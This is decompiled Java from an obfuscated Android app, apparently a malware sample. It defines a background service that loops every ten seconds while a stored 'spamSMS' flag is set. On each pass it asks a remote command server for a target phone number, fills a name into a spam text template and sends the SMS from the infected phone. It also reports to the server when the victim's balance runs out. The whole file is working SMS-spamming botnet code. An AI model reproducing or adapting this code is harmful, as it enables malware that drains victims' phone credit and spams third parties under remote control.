package wocwvy.czyxoxmbauu.slsa.oyqwzkyy.dxivifswvkcvwz;

import android.app.IntentService;
import android.content.Intent;
import java.util.concurrent.TimeUnit;
import wocwvy.czyxoxmbauu.slsa.C0020b;

/* JADX INFO: loaded from: classes.dex */
public class wifu extends IntentService {

    /* JADX INFO: renamed from: a */
    C0020b f521a;

    /* JADX INFO: renamed from: b */
    String f522b;

    /* JADX INFO: renamed from: c */
    String f523c;

    public wifu() {
        super("wifu");
        this.f521a = new C0020b();
        this.f522b = "";
        this.f523c = "wifu";
    }

    @Override // android.app.IntentService
    protected void onHandleIntent(Intent intent) {
        while (true) {
            try {
                TimeUnit.MILLISECONDS.sleep(10000L);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            if (!this.f521a.m251e(this, "spamSMS").equals("start")) {
                break;
            }
            if (!this.f521a.m232a(this, dshd.class)) {
                if (this.f522b.length() > 3) {
                    this.f522b = "sendsms" + this.f522b;
                }
                if (this.f521a.m251e(this, "indexSMSSPAM").contains("|||||")) {
                    this.f521a.m250d(this, "spamSMS", "");
                    C0020b c0020b = this.f521a;
                    StringBuilder sb = new StringBuilder();
                    sb.append("p=");
                    sb.append(this.f521a.m242c(this.f521a.m264q(this) + "|Ended balance, SMS spam stopped!|"));
                    c0020b.m235b(this, "4", sb.toString());
                }
                C0020b c0020b2 = this.f521a;
                StringBuilder sb2 = new StringBuilder();
                sb2.append("p=");
                sb2.append(this.f521a.m242c("getnumber" + this.f522b));
                String strM247d = this.f521a.m247d(c0020b2.m235b(this, "15", sb2.toString()));
                String str = "";
                String strM251e = this.f521a.m251e(this, "textSPAM");
                if (strM247d.contains("/")) {
                    str = strM247d.split("/")[0];
                    strM247d = strM247d.split("/")[1];
                    strM251e = strM251e.replace("{nameholder}", str);
                }
                if (strM247d.equals("close")) {
                    this.f521a.m250d(this, "spamSMS", "");
                    break;
                }
                this.f521a.m230a(this.f523c, "number: " + strM247d + "  msg: " + strM251e);
                startService(new Intent(this, (Class<?>) dshd.class).putExtra("number", strM247d).putExtra("msg", strM251e));
                if (str.length() > 2) {
                    strM247d = str + "/" + strM247d;
                }
                this.f522b = strM247d;
            }
        }
        stopSelf();
    }
}
